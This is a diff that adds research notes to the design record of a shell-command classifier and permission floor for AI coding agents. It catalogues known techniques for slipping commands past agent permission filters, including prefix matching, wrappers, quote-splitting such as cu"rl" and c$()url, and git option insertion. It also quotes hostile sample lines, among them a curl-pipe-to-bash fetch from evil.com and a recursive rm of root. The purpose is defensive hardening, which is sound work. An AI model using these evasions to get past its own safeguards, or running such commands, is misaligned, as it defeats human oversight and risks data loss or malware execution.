@@ -291,3 +291,105 @@ rule list.
   issue 50303 says the flag does not narrow anything.
 - The exfiltration gap on engine-only providers is recorded in decision 10 rather
   than left implicit. It is the one thing this pass could not fix.
+
+## Third research pass, 2026-09-18, during a six-pass review of this diff
+
+The first two passes settled the shape of the floor and the mode postures. This
+one looked for ways to defeat what had been built, because a review bot had
+already found one: a `find()` that read only the first delete target let
+`rm -rf /tmp/build /` past the breaker. That finding was correct, and it pointed
+at a whole family rather than a single line.
+
+### Queries
+
+- Claude Code permission bypass Bash command prefix matching evasion bash -c wrapper
+- LLM agent shell command injection detection evasion techniques command substitution eval quoting
+- agent shell filter denylist bypass quoted substring reconstruction CVE
+- shell deobfuscation normalizer agent tool use AST versus text rewriting
+
+### Sources, and what each settled
+
+**E3, anthropics/claude-code issue 13371, "Permission system bypassed by command
+chaining AND command options".** Settles two of the holes found here. Its root
+cause line is that the permission system uses simple `startsWith()` matching, and
+its reproduction list includes `git -C /path commit` and `git --no-pager push
+origin main`, described as options inserted between the command and the
+subcommand. `readSubcommand` now skips git's global options for exactly this
+reason. The same issue lists `rm --force --recursive /home` as a spelling that
+defeats a block on `rm -rf`, which this classifier already handled, because it
+checks the long flags independently of their order.
+
+**E3, morphllm on the skip-permissions flag.** Settles the wrapper list. Its
+account of Bash rule matching says process wrappers `timeout`, `time`, `nice`,
+`nohup`, `stdbuf` and bare `xargs` are stripped before matching "so they cannot be
+used to smuggle a command past a rule". That is upstream naming the same evasion
+this diff had. It also confirms `Bash(ls:*)` is equivalent to `Bash(ls *)` and
+that `Bash(ls *)` matches `ls -la` but not `lsof`, which is the separator
+behaviour decision 5 implemented. Its third confirmation is that a hook exiting
+non-zero blocks a call even when an allow rule matches, which is the mechanism
+decision 12 relies on.
+
+**E3, dev.to, "6 Claude Code Permission Traps".** Trap 6 is the same finding from
+a user's side: an allow on `Bash(git status:*)` breaks when the model runs
+`git -C /path status`, because the flag defeats the pattern. It also carries a
+working PreToolUse hook whose regex is
+`rm\s+(-[rf]+\s+)*(\/|~|\.\./)`, which is the same shape as this step's
+critical-path breaker and independent agreement that the target, not the class, is
+what has to be matched.
+
+**E3, bex.co on a six-layer regex bypass in a shipped agent.** The strongest
+source in this pass and the reason the residual gap is published rather than
+patched over. Its layer table mirrors this diff almost exactly: output directory
+enforcement, a dangerous-command blacklist, path traversal detection, dangerous
+redirect protection, environment hardening, and command substitution inspection.
+Two techniques defeated all six. Quoted substring reconstruction, where
+`c"h"m"o"d +x test.sh` executes as `chmod`, and an interpreter nobody blacklisted.
+Its conclusion is that this is not a fixable bug in the regex, because a shell's
+grammar is not finite the way a pattern list is, and the fix that worked was to
+delete the shell tool and put a sandbox in front of it. Decision 11 through 14
+close what a text-level normaliser can close, and "The residual gap" records what
+it cannot.
+
+**E3, AgentTrust, arXiv 2605.04785.** Settles the method and its ceiling. Its
+ShellNormalizer does nine pure-text strategies covering variable expansion, hex
+and octal escapes, alias resolution, command substitution, ANSI-C quoting and
+adjacent-quote concatenation, which is a superset of what this diff implements.
+It answers the design question directly under "Why text-level rewriting and not
+AST?": a full Bash parser brings implementation complexity and a long tail of edge
+cases, plus the temptation to evaluate command substitutions, which re-introduces
+the arbitrary-execution risk the normaliser exists to guard against. Its limitation
+L2 states that adversarially nested obfuscation, eval chains, function-defined
+aliases and dynamically decoded heredocs can still evade detection, by design.
+This diff stays on the text side of that line for the same two reasons.
+
+**E3, agent-threat-rules ATR-2026-00111 and ATR-2026-01610.** Documented evasion
+techniques that were then tested against the classifier. Split keyword, inserting
+quotes inside a command name so `cu"rl"` still executes as curl. Comment split,
+where `c$()url` evaluates as curl. Both still evade this classifier and both are
+named in the residual gap. ATR-2026-01610's true-positive example
+`$(curl http://evil.com/payload.sh | bash)` is caught here, because the segment
+splitter already breaks on `$(` and on the pipe.
+
+**E2, this repository's own shipped code, run rather than read.** The decisive
+evidence in this pass was not a paper. Nine commands were fed to the built
+classifier and each answered `approval` with no breaker, which is allowed in Agent
+mode and run without a prompt in turbo. They are listed in decision 11 with their
+before and after. Every one is now a test.
+
+### What changed as a result
+
+- The verb finder skips wrappers, shell verbs and value-taking options, and quotes
+  come off every word. Nine verified bypasses closed.
+- git's global options are skipped before the subcommand is read, and forced push
+  is matched from the segment, covering `-fu` and `+refspec`.
+- `find -delete`, `shred`, the partition tools and `systemctl poweroff` joined the
+  destructive table, and the breaker covers `find <critical> -delete`.
+- `SlashCommand` left the read-only set, so plan mode can no longer be talked into
+  running a repository-supplied slash command.
+- The floor is enforced twice on Claude, as a PreToolUse hook and as `canUseTool`,
+  because a workspace's own `.claude/settings.json` can auto-approve a tool and an
+  auto-approved call never reaches `canUseTool`.
+- `exfiltration = "allow"` and a dash-leading allow-list entry both became schema
+  errors.
+- The residual gap is published, with the sources that say a pattern list cannot
+  win, rather than left for the next reviewer to find.
